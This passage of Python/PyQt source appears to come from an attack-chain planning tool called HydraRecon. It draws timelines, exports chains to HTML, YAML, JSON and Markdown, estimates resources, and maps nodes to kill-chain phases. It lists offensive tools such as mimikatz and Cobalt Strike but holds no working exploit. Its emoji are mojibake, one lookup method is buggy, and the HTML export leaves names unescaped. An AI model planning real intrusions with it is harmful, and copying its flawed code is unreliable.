            label = entry.node_name[:18] + "..." if len(entry.node_name) > 18 else entry.node_name
            painter.drawText(5, y + 18, label)
            
            # Timeline bar
            bar_start = left_margin + ((entry.start_time - min_time) / total_duration) * timeline_width
            bar_width = max(10, (entry.duration_minutes / total_duration) * timeline_width)
            
            bar_rect = QRectF(bar_start, y + 5, bar_width, bar_height)
            
            # Color based on status and critical path
            is_critical = entry.node_id in self.critical_path_entries
            
            status_colors = {
                'pending': QColor(80, 80, 80),
                'running': QColor(0, 150, 255),
                'success': QColor(0, 200, 0),
                'failed': QColor(255, 50, 50),
                'skipped': QColor(150, 150, 150),
            }
            
            base_color = status_colors.get(entry.status, QColor(100, 100, 100))
            
            # Draw bar
            if is_critical and self.show_critical_path:
                # Critical path glow
                glow_rect = bar_rect.adjusted(-3, -3, 3, 3)
                painter.setPen(Qt.PenStyle.NoPen)
                painter.setBrush(QColor(255, 100, 0, 80))
                painter.drawRoundedRect(glow_rect, 5, 5)
                
            gradient = QLinearGradient(bar_rect.left(), bar_rect.top(),
                                       bar_rect.left(), bar_rect.bottom())
            gradient.setColorAt(0, base_color.lighter(130))
            gradient.setColorAt(1, base_color.darker(110))
            
            painter.setPen(QPen(base_color.lighter(150), 1))
            painter.setBrush(gradient)
            painter.drawRoundedRect(bar_rect, 4, 4)
            
            # Duration text
            painter.setPen(QColor(255, 255, 255))
            painter.setFont(QFont("Consolas", 8, QFont.Weight.Bold))
            painter.drawText(bar_rect, Qt.AlignmentFlag.AlignCenter, f"{entry.duration_minutes}m")
            
            # Draw dependencies
            if self.show_dependencies:
                for dep_id in entry.dependencies:
                    dep_entry = next((e for e in self.timeline_entries if e.node_id == dep_id), None)
                    if dep_entry:
                        dep_idx = self.timeline_entries.index(dep_entry)
                        dep_y = top_margin + dep_idx * row_height
                        dep_end = left_margin + ((dep_entry.start_time - min_time + dep_entry.duration_minutes) / total_duration) * timeline_width
                        
                        # Draw dependency arrow
                        painter.setPen(QPen(QColor(100, 100, 150, 150), 1, Qt.PenStyle.DashLine))
                        path = QPainterPath()
                        path.moveTo(dep_end, dep_y + row_height / 2)
                        path.lineTo(bar_start, y + row_height / 2)
                        painter.drawPath(path)
        
        # Legend
        legend_y = self.height() - 25
        painter.setFont(QFont("Consolas", 8))
        painter.setPen(QColor(150, 150, 150))
        painter.drawText(10, legend_y, "Legend:")
        
        legend_items = [
            ("üü¢ Success", QColor(0, 200, 0)),
            ("üîµ Running", QColor(0, 150, 255)),
            ("üî¥ Failed", QColor(255, 50, 50)),
            ("üü† Critical Path", QColor(255, 100, 0)),
        ]
        
        x_offset = 70
        for text, color in legend_items:
            painter.setPen(color)
            painter.drawText(x_offset, legend_y, text)
            x_offset += 100


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# CHAIN EXPORT ENGINE - PDF / DOCX / HTML / YAML
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class ChainExportEngine:
    """Export attack chains to multiple formats"""
    
    @staticmethod
    def export_to_yaml(chain_data: dict, filepath: str) -> bool:
        """Export chain to YAML format for automation tools"""
        try:
            import yaml
            
            export_data = {
                'version': '1.0',
                'name': chain_data.get('name', 'Unnamed Chain'),
                'description': chain_data.get('description', ''),
                'created': datetime.now().isoformat(),
                'mitre_mapping': chain_data.get('mitre_tactics', []),
                'complexity_score': chain_data.get('complexity', {}),
                'nodes': [],
                'connections': chain_data.get('connections', []),
            }
            
            for node in chain_data.get('nodes', []):
                export_data['nodes'].append({
                    'id': node.get('id'),
                    'name': node.get('name'),
                    'type': node.get('type'),
                    'cve': node.get('cve'),
                    'success_probability': node.get('success_probability', 0.5),
                    'payload': node.get('payload', {}),
                    'prerequisites': node.get('prerequisites', []),
                    'duration_minutes': node.get('duration', 15),
                })
            
            with open(filepath, 'w') as f:
                yaml.dump(export_data, f, default_flow_style=False, sort_keys=False)
            return True
        except Exception as e:
            print(f"YAML export error: {e}")
            return False
    
    @staticmethod
    def export_to_html(chain_data: dict, filepath: str) -> bool:
        """Export chain to interactive HTML report"""
        try:
            nodes = chain_data.get('nodes', [])
            connections = chain_data.get('connections', [])
            complexity = chain_data.get('complexity', {})
            
            html_content = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attack Chain Report - {chain_data.get('name', 'Unnamed')}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ 
            font-family: 'Segoe UI', Arial, sans-serif; 
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #e0e0e0;
            min-height: 100vh;
            padding: 40px;
        }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        h1 {{ 
            color: #00d4ff; 
            font-size: 2.5em; 
            margin-bottom: 10px;
            text-shadow: 0 0 20px rgba(0, 212, 255, 0.5);
        }}
        .meta {{ color: #888; margin-bottom: 30px; }}
        .section {{ 
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
        }}
        .section h2 {{ 
            color: #ff6b35; 
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }}
        .complexity-grid {{ 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
        }}
        .complexity-card {{
            background: rgba(0, 150, 255, 0.1);
            border: 1px solid rgba(0, 150, 255, 0.3);
            border-radius: 8px;
            padding: 15px;
            text-align: center;
        }}
        .complexity-value {{ font-size: 2em; color: #00d4ff; font-weight: bold; }}
        .complexity-label {{ color: #888; font-size: 0.9em; }}
        .node-list {{ list-style: none; }}
        .node-item {{
            background: rgba(255, 255, 255, 0.03);
            border-left: 4px solid #ff6b35;
            padding: 15px 20px;
            margin-bottom: 10px;
            border-radius: 0 8px 8px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }}
        .node-name {{ font-weight: bold; color: #fff; }}
        .node-type {{ 
            background: #ff6b35;
            color: #000;
            padding: 3px 10px;
            border-radius: 12px;
            font-size: 0.8em;
        }}
        .node-cve {{ color: #ff4444; font-family: monospace; }}
        .mitre-tag {{
            display: inline-block;
            background: rgba(255, 100, 0, 0.2);
            border: 1px solid #ff6400;
            padding: 5px 12px;
            border-radius: 15px;
            margin: 5px;
            font-size: 0.85em;
        }}
        .flow-diagram {{
            padding: 20px;
            text-align: center;
        }}
        .flow-step {{
            display: inline-block;
            background: linear-gradient(135deg, #2a2a4a 0%, #1a1a3a 100%);
            border: 2px solid #00d4ff;
            padding: 15px 25px;
            border-radius: 10px;
            margin: 10px;
            position: relative;
        }}
        .flow-arrow {{
            display: inline-block;
            color: #00d4ff;
            font-size: 1.5em;
            margin: 0 5px;
        }}
        footer {{
            text-align: center;
            color: #555;
            padding: 30px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            margin-top: 40px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>‚ö° {chain_data.get('name', 'Attack Chain Report')}</h1>
        <p class="meta">Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | Nodes: {len(nodes)} | Connections: {len(connections)}</p>
        
        <div class="section">
            <h2>üìä Complexity Analysis</h2>
            <div class="complexity-grid">
                <div class="complexity-card">
                    <div class="complexity-value">{complexity.get('total_score', 'N/A')}</div>
                    <div class="complexity-label">Total Score</div>
                </div>
                <div class="complexity-card">
                    <div class="complexity-value">{complexity.get('attack_surface', 'N/A')}</div>
                    <div class="complexity-label">Attack Surface</div>
                </div>
                <div class="complexity-card">
                    <div class="complexity-value">{complexity.get('detection_risk', 'N/A')}%</div>
                    <div class="complexity-label">Detection Risk</div>
                </div>
                <div class="complexity-card">
                    <div class="complexity-value">{complexity.get('rating', 'N/A')}</div>
                    <div class="complexity-label">Rating</div>
                </div>
            </div>
        </div>
        
        <div class="section">
            <h2>üéØ MITRE ATT&CK Mapping</h2>
            <div>
                {''.join([f'<span class="mitre-tag">{t}</span>' for t in chain_data.get('mitre_tactics', ['No tactics mapped'])])}
            </div>
        </div>
        
        <div class="section">
            <h2>üîó Attack Flow</h2>
            <div class="flow-diagram">
                {'<span class="flow-arrow">‚Üí</span>'.join([f'<span class="flow-step">{n.get("name", "Node")}</span>' for n in nodes[:8]])}
                {'<span class="flow-step">...</span>' if len(nodes) > 8 else ''}
            </div>
        </div>
        
        <div class="section">
            <h2>üìã Node Details</h2>
            <ul class="node-list">
                {''.join([f"""
                <li class="node-item">
                    <div>
                        <span class="node-name">{n.get('name', 'Unknown')}</span>
                        {f'<span class="node-cve">{n.get("cve")}</span>' if n.get('cve') else ''}
                    </div>
                    <span class="node-type">{n.get('type', 'exploit').upper()}</span>
                </li>""" for n in nodes])}
            </ul>
        </div>
        
        <footer>
            <p>üõ°Ô∏è Generated by HydraRecon - Exploit Chain Builder Ultimate Edition</p>
            <p>For authorized security testing only</p>
        </footer>
    </div>
</body>
</html>'''
            
            with open(filepath, 'w') as f:
                f.write(html_content)
            return True
        except Exception as e:
            print(f"HTML export error: {e}")
            return False
    
    @staticmethod
    def export_to_json(chain_data: dict, filepath: str) -> bool:
        """Export chain to JSON format"""
        try:
            import json
            
            export_data = {
                'version': '1.0',
                'format': 'hydrarecon_chain',
                'exported': datetime.now().isoformat(),
                'chain': chain_data,
            }
            
            with open(filepath, 'w') as f:
                json.dump(export_data, f, indent=2, default=str)
            return True
        except Exception as e:
            print(f"JSON export error: {e}")
            return False
    
    @staticmethod
    def export_to_markdown(chain_data: dict, filepath: str) -> bool:
        """Export chain to Markdown documentation"""
        try:
            nodes = chain_data.get('nodes', [])
            complexity = chain_data.get('complexity', {})
            
            md_content = f'''# üîó Attack Chain Report: {chain_data.get('name', 'Unnamed Chain')}

**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  
**Total Nodes:** {len(nodes)}  
**Complexity Rating:** {complexity.get('rating', 'Unknown')}

---

## üìä Complexity Analysis

| Metric | Value |
|--------|-------|
| Total Score | {complexity.get('total_score', 'N/A')} |
| Attack Surface | {complexity.get('attack_surface', 'N/A')} |
| Detection Risk | {complexity.get('detection_risk', 'N/A')}% |
| Unique Exploits | {complexity.get('unique_exploits', 'N/A')} |

---

## üéØ MITRE ATT&CK Tactics

{chr(10).join(['- ' + t for t in chain_data.get('mitre_tactics', ['None mapped'])])}

---

## üîó Attack Chain Nodes

'''
            for i, node in enumerate(nodes, 1):
                md_content += f'''### {i}. {node.get('name', 'Unknown Node')}

- **Type:** {node.get('type', 'exploit').upper()}
- **CVE:** {node.get('cve', 'N/A')}
- **Success Probability:** {node.get('success_probability', 0.5) * 100:.1f}%
- **Duration:** {node.get('duration', 15)} minutes

'''
            
            md_content += '''---

## ‚ö†Ô∏è Disclaimer

This attack chain documentation is generated for **authorized security testing purposes only**.
Unauthorized use of these techniques is illegal and unethical.

---

*Generated by HydraRecon - Exploit Chain Builder Ultimate Edition*
'''
            
            with open(filepath, 'w') as f:
                f.write(md_content)
            return True
        except Exception as e:
            print(f"Markdown export error: {e}")
            return False


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# RESOURCE ESTIMATION ENGINE
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class ResourceEstimator:
    """Estimate resources required for attack chain execution"""
    
    SKILL_LEVELS = {
        'novice': {'multiplier': 2.0, 'success_penalty': -0.15},
        'intermediate': {'multiplier': 1.3, 'success_penalty': -0.05},
        'expert': {'multiplier': 1.0, 'success_penalty': 0.0},
        'elite': {'multiplier': 0.7, 'success_penalty': 0.10},
    }
    
    TOOL_REQUIREMENTS = {
        'recon': ['nmap', 'masscan', 'shodan', 'amass'],
        'exploit': ['metasploit', 'burpsuite', 'sqlmap', 'custom_exploits'],
        'payload': ['msfvenom', 'cobalt_strike', 'empire', 'sliver'],
        'persistence': ['mimikatz', 'covenant', 'silenttrinity'],
        'exfil': ['dns_exfil', 'http_tunnel', 'steganography_tools'],
    }
    
    BASE_COSTS = {
        'recon': {'time_minutes': 30, 'complexity': 1, 'stealth_cost': 0.1},
        'exploit': {'time_minutes': 45, 'complexity': 3, 'stealth_cost': 0.3},
        'payload': {'time_minutes': 20, 'complexity': 2, 'stealth_cost': 0.2},
        'persistence': {'time_minutes': 25, 'complexity': 3, 'stealth_cost': 0.4},
        'exfil': {'time_minutes': 35, 'complexity': 2, 'stealth_cost': 0.5},
    }
    
    @classmethod
    def estimate_chain(cls, nodes: List[dict], skill_level: str = 'intermediate') -> ResourceEstimation:
        """Estimate total resources for a chain"""
        skill = cls.SKILL_LEVELS.get(skill_level, cls.SKILL_LEVELS['intermediate'])
        
        total_time = 0
        total_complexity = 0
        total_stealth = 0
        required_tools = set()
        
        for node in nodes:
            node_type = node.get('type', 'exploit')
            base = cls.BASE_COSTS.get(node_type, cls.BASE_COSTS['exploit'])
            
            total_time += base['time_minutes'] * skill['multiplier']
            total_complexity += base['complexity']
            total_stealth += base['stealth_cost']
            
            tools = cls.TOOL_REQUIREMENTS.get(node_type, [])
            required_tools.update(tools)
        
        # Estimate cost (fictional for educational purposes)
        infrastructure_cost = len(nodes) * 50  # $50 per node for C2, VPS, etc.
        tool_cost = len(required_tools) * 100  # $100 per specialized tool
        
        return ResourceEstimation(
            total_time_minutes=int(total_time),
            skill_level_required=skill_level,
            tools_required=list(required_tools),
            estimated_cost_usd=infrastructure_cost + tool_cost,
            success_modifier=skill['success_penalty'],
            stealth_budget=max(0, 1.0 - total_stealth)
        )


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# PREREQUISITES MANAGER
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class PrerequisitesManager:
    """Manage attack chain prerequisites and dependencies"""
    
    COMMON_PREREQUISITES = {
        'network_access': AttackPrerequisite(
            prereq_id='net_access',
            name='Network Access',
            description='Access to target network segment',
            prereq_type='access',
            is_satisfied=False,
            required_for=['recon', 'exploit']
        ),
        'valid_credentials': AttackPrerequisite(
            prereq_id='valid_creds',
            name='Valid Credentials',
            description='Compromised or obtained user credentials',
            prereq_type='information',
            is_satisfied=False,
            required_for=['persistence', 'lateral_movement']
        ),
        'local_admin': AttackPrerequisite(
            prereq_id='local_admin',
            name='Local Admin Rights',
            description='Administrator privileges on compromised host',
            prereq_type='access',
            is_satisfied=False,
            required_for=['payload', 'persistence']
        ),
        'domain_recon': AttackPrerequisite(
            prereq_id='domain_recon',
            name='Domain Enumeration',
            description='Active Directory structure mapped',
            prereq_type='information',
            is_satisfied=False,
            required_for=['lateral_movement', 'privilege_escalation']
        ),
        'c2_infrastructure': AttackPrerequisite(
            prereq_id='c2_infra',
            name='C2 Infrastructure',
            description='Command and control servers deployed',
            prereq_type='tool',
            is_satisfied=False,
            required_for=['payload', 'exfil']
        ),
        'egress_channel': AttackPrerequisite(
            prereq_id='egress',
            name='Egress Channel',
            description='Outbound communication path established',
            prereq_type='access',
            is_satisfied=False,
            required_for=['exfil', 'c2_comm']
        ),
    }
    
    def __init__(self):
        self.prerequisites: Dict[str, AttackPrerequisite] = {}
        self._init_default_prerequisites()
    
    def _init_default_prerequisites(self):
        """Initialize with common prerequisites"""
        for key, prereq in self.COMMON_PREREQUISITES.items():
            # Create a copy to avoid mutating the class-level defaults
            self.prerequisites[key] = AttackPrerequisite(
                prereq_id=prereq.prereq_id,
                name=prereq.name,
                description=prereq.description,
                prereq_type=prereq.prereq_type,
                is_satisfied=prereq.is_satisfied,
                required_for=prereq.required_for.copy()
            )
    
    def check_node_prerequisites(self, node_type: str) -> List[AttackPrerequisite]:
        """Get unsatisfied prerequisites for a node type"""
        unsatisfied = []
        for prereq in self.prerequisites.values():
            if node_type in prereq.required_for and not prereq.is_satisfied:
                unsatisfied.append(prereq)
        return unsatisfied
    
    def satisfy_prerequisite(self, prereq_id: str):
        """Mark a prerequisite as satisfied"""
        if prereq_id in self.prerequisites:
            self.prerequisites[prereq_id].is_satisfied = True
    
    def get_all_prerequisites(self) -> List[AttackPrerequisite]:
        """Get all prerequisites"""
        return list(self.prerequisites.values())
    
    def add_custom_prerequisite(self, prereq: AttackPrerequisite):
        """Add a custom prerequisite"""
        self.prerequisites[prereq.prereq_id] = prereq


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# CYBER KILL CHAIN MAPPER - Lockheed Martin Kill Chain Integration
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

@dataclass
class KillChainPhase:
    """Represents a Cyber Kill Chain phase"""
    phase_id: str
    name: str
    description: str
    icon: str
    color: str
    node_types: List[str]
    techniques: List[str]

class CyberKillChainMapper:
    """Map attack chain nodes to Cyber Kill Chain phases"""
    
    KILL_CHAIN_PHASES = [
        KillChainPhase(
            phase_id='reconnaissance',
            name='1. Reconnaissance',
            description='Research, identify, and select targets',
            icon='üîç',
            color='#00aaff',
            node_types=['recon'],
            techniques=['Open Source Research', 'Social Engineering', 'Network Scanning']
        ),
        KillChainPhase(
            phase_id='weaponization',
            name='2. Weaponization',
            description='Create malware and exploits',
            icon='‚öîÔ∏è',
            color='#ff8800',
            node_types=['exploit'],
            techniques=['Exploit Development', 'Malware Creation', 'Payload Crafting']
        ),
        KillChainPhase(
            phase_id='delivery',
            name='3. Delivery',
            description='Deliver weaponized bundle to target',
            icon='üìß',
            color='#ff4444',
            node_types=['exploit', 'payload'],
            techniques=['Phishing', 'Drive-by Download', 'USB Drop']
        ),
        KillChainPhase(
            phase_id='exploitation',
            name='4. Exploitation',
            description='Trigger exploit and gain access',
            icon='üí•',
            color='#ff0000',
            node_types=['exploit'],
            techniques=['Zero-day Exploit', 'Known Vulnerability', 'Social Engineering']
        ),
        KillChainPhase(
            phase_id='installation',
            name='5. Installation',
            description='Install backdoor and maintain access',
            icon='üì•',
            color='#9b59b6',
            node_types=['payload', 'persistence'],
            techniques=['Backdoor Installation', 'Rootkit', 'Scheduled Task']
        ),
        KillChainPhase(
            phase_id='command_control',
            name='6. Command & Control',
            description='Establish C2 channel',
            icon='üì°',
            color='#e91e63',
            node_types=['payload', 'persistence'],
            techniques=['HTTP C2', 'DNS Tunneling', 'Encrypted Channel']
        ),
        KillChainPhase(
            phase_id='actions',
            name='7. Actions on Objectives',
            description='Achieve attack goals',
            icon='üéØ',
            color='#ffcc00',
            node_types=['exfil', 'persistence'],
            techniques=['Data Exfiltration', 'Destruction', 'Manipulation']
        ),
    ]
    
    @classmethod
    def map_nodes_to_phases(cls, nodes: List[dict]) -> Dict[str, List[dict]]:
        """Map chain nodes to kill chain phases"""
        mapping = {phase.phase_id: [] for phase in cls.KILL_CHAIN_PHASES}
        
        for node in nodes:
            node_type = node.get('type', 'exploit')
            for phase in cls.KILL_CHAIN_PHASES:
                if node_type in phase.node_types:
                    mapping[phase.phase_id].append(node)
                    break  # Each node maps to first matching phase
        
        return mapping
    
    @classmethod
    def get_coverage_score(cls, nodes: List[dict]) -> float:
        """Calculate kill chain coverage (0-100)"""
        mapping = cls.map_nodes_to_phases(nodes)
        phases_covered = sum(1 for nodes_list in mapping.values() if nodes_list)
        return (phases_covered / len(cls.KILL_CHAIN_PHASES)) * 100
    
    @classmethod
    def get_phase_by_id(cls, phase_id: str) -> Optional[KillChainPhase]:
        """Get phase by ID"""
        for phase in cls.KILL_CHAIN_PHASES:
            return phase if phase.phase_id == phase_id else None
        return None


class KillChainWidget(QWidget):
    """Visual kill chain phase representation"""
    
    phase_clicked = pyqtSignal(str)  # Emit phase_id when clicked
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setMinimumHeight(80)
        self.phase_mapping: Dict[str, List[dict]] = {}
        self.hovered_phase = None
        self.setMouseTracking(True)
        
    def set_chain_data(self, nodes: List[dict]):
        """Update with current chain nodes"""
        self.phase_mapping = CyberKillChainMapper.map_nodes_to_phases(nodes)
        self.update()
    
    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)
        
        # Background
        painter.fillRect(self.rect(), QColor(15, 15, 25))
        
        phases = CyberKillChainMapper.KILL_CHAIN_PHASES
        phase_width = self.width() / len(phases)
        
        for i, phase in enumerate(phases):
            x = i * phase_width
            nodes_in_phase = self.phase_mapping.get(phase.phase_id, [])
            is_covered = len(nodes_in_phase) > 0
            is_hovered = self.hovered_phase == phase.phase_id
            
            # Phase box
            rect = QRectF(x + 2, 10, phase_width - 4, self.height() - 20)
            
            # Background gradient based on coverage
            if is_covered:
                gradient = QLinearGradient(rect.left(), rect.top(), rect.left(), rect.bottom())
                base_color = QColor(phase.color)
                gradient.setColorAt(0, base_color.lighter(120) if is_hovered else base_color)
                gradient.setColorAt(1, base_color.darker(150))
                painter.setBrush(gradient)
            else:
                painter.setBrush(QColor(40, 40, 50))
            
            # Border
            if is_hovered:
                painter.setPen(QPen(QColor(255, 255, 255), 2))
            else:
                painter.setPen(QPen(QColor(phase.color) if is_covered else QColor(60, 60, 60), 1))
            
            painter.drawRoundedRect(rect, 5, 5)
            
            # Arrow connector
            if i < len(phases) - 1:
                arrow_x = x + phase_width - 2
                painter.setPen(QPen(QColor(100, 100, 100), 2))
                painter.drawLine(int(arrow_x), int(self.height() / 2), 
                               int(arrow_x + 4), int(self.height() / 2))
            
            # Icon and text
            painter.setPen(QColor(255, 255, 255) if is_covered else QColor(80, 80, 80))
            painter.setFont(QFont("Segoe UI Emoji", 16))
            painter.drawText(rect.adjusted(0, 5, 0, -rect.height()/2), 
                           Qt.AlignmentFlag.AlignCenter, phase.icon)
            
            # Phase number
            painter.setFont(QFont("Consolas", 8, QFont.Weight.Bold))
            painter.drawText(rect.adjusted(0, rect.height()/2 - 5, 0, 0),
                           Qt.AlignmentFlag.AlignCenter, 
                           f"{len(nodes_in_phase)} nodes" if is_covered else "‚Äî")
        
        # Title
        painter.setPen(QColor(150, 150, 150))
        painter.setFont(QFont("Consolas", 8))
        coverage = CyberKillChainMapper.get_coverage_score(
            [n for nodes in self.phase_mapping.values() for n in nodes])
        painter.drawText(5, 12, f"Kill Chain Coverage: {coverage:.0f}%")
    
    def mouseMoveEvent(self, event):
        phases = CyberKillChainMapper.KILL_CHAIN_PHASES
        phase_width = self.width() / len(phases)
        phase_idx = int(event.position().x() / phase_width)
        
        if 0 <= phase_idx < len(phases):
            new_phase = phases[phase_idx].phase_id
            if new_phase != self.hovered_phase:
                self.hovered_phase = new_phase
                phase = phases[phase_idx]
                self.setToolTip(f"{phase.name}\n{phase.description}")
                self.update()
        else:
            self.hovered_phase = None
            self.update()
    
    def leaveEvent(self, event):
        self.hovered_phase = None
        self.update()
    
    def mousePressEvent(self, event):
        if self.hovered_phase:
            self.phase_clicked.emit(self.hovered_phase)


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# THREAT INTELLIGENCE FUSION ENGINE
